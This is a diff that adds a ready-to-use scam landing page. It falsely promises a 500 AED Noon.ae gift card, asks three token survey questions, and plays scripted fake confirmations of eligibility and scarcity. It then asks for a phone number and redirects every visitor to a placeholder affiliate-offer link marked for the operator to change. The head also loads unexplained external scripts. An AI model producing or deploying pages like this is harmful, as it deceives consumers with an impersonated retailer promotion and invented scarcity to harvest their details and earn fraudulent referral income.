@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <base href="">
+    <script type="text/javascript" async="" src="js-get"></script>
+    <script type="text/javascript" async="" src="filter-domains"></script>
+    <script async="" type="text/javascript" src="2ErTrBMV_3231.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>500 AED GIFT CARD</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script  type="text/javascript" src="js/jquery.min.js"></script>
+</head>
+
+<body>
+    <div class="header" style="background-color:#000000"> Stand a chance to win an AED 500 GIFT CARD for Shopping at Noon.Ae!</div>
+    <div class="row clearfix" id="allcontent">
+        <div class="medium-8 columns" id="content_box_left">
+            <div id="content">
+                <div class="wrapper">
+                    <div id="content_text">
+                        <p><strong>Congratulations</strong>
+                        </p>
+                        <p>We give a limited number of people in your area to get into this giveaway participation in a short survey.</p>
+                        <p>You are preselected for an</p>
+                        <p><strong>500 AED GIFT CARD</strong>
+                        </p>
+                        <p>To claim please answer 3 questions below:</p>
+                    </div>
+                    <div id="content_image"> <img src="images/336px-iphone8.jpg" alt=""> </div>
+                </div>
+            </div>
+            <div id="questions">
+                <div class="wrapper">
+                    <div id="question_block">
+                        <div id="question_1" class="question">
+                            <h4>Question 1 of 3</h4>
+                            <h3>Do you live in The United Arab Emirates?</h3>
+                            <button class="button" onclick="next_question()">Yes</button>
+                            <button class="button" onclick="next_question()">No</button>
+                        </div>
+                        <div id="question_2" class="question">
+                            <h4>Question 2 of 3</h4>
+                            <h3>Have you ever won 500 AED GIFT CARD Before??</h3>
+                            <button class="button" onclick="next_question()">Yes</button>
+                            <button class="button" onclick="next_question()">No</button>
+                        </div>
+                        <div id="question_3" class="question">
+                            <h4>Question 3 of 3</h4>
+                            <h3>How old are you?</h3>
+                            <button class="button" onclick="next_question()">15-20</button>
+                            <button class="button" onclick="next_question()">21-25</button>
+                            <button class="button" onclick="next_question()">25-34</button>
+                            <button class="button" onclick="next_question()">35+</button>
+                        </div>
+                    </div>
+                    <div id="results_block">
+                        <div id="result_1" class="result"> <strong>Your answers are being processed...</strong> </div>
+                        <div id="result_2" class="result"> <strong>No double-registrations found ✔</strong>
+                            <br> <strong>Three (3) 500 AED GIFT CARDS left ✔ </strong> </div>
+                        <div id="result_3" class="result"> <strong>You have been selected! ✔ </strong>
+                            <br> <strong>Enter your phone number</strong> </div> <img id="prozess_bar" src="images/loader.gif" alt="loader"> </div>
+                    <div id="footer">
+                        <div> </div>
+                        <div>
+                            <div style="display: inline-block;" class="blackfont"> </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        var link = 'http://www.myCpaOfferLink';//change redirect url
+        var question_idx = 2;
+
+        function next_question() {
+            var all_el = document.getElementsByClassName("question");
+            var question_el = document.getElementById("question_" + question_idx);
+            for (var i = 0; i < all_el.length; i++) {
+                all_el[i].style.display = 'none';
+            }
+            if (question_idx < (all_el.length + 1)) {
+                question_el.style.display = 'block';
+                question_idx++;
+            } else {
+                hide_block("question_block");
+                show_block("results_block");
+                results();
+            }
+            return false;
+        }
+
+        function show_block(element) {
+            document.getElementById(element).style.display = 'block';
+        }
+
+        function hide_block(element) {
+            document.getElementById(element).style.display = 'none';
+        }
+
+        function results() {
+            var load_interval = 3000;
+            var results_idx = 2;
+            var all_result_el = document.getElementsByClassName("result");
+            var count_results = setInterval(function() {
+                for (var i = 0; i < all_result_el.length; i++) {
+                    all_result_el[i].style.display = 'none';
+                }
+                document.getElementById("result_" + results_idx).style.display = 'block';
+                results_idx++;
+                if (results_idx > all_result_el.length) {
+                    clearInterval(count_results);
+                    setTimeout(function() {
+                        document.location.href = link;
+                    }, load_interval);
+                }
+            }, load_interval);
+        }
+    </script>
+     
+</body>
+
+</html>
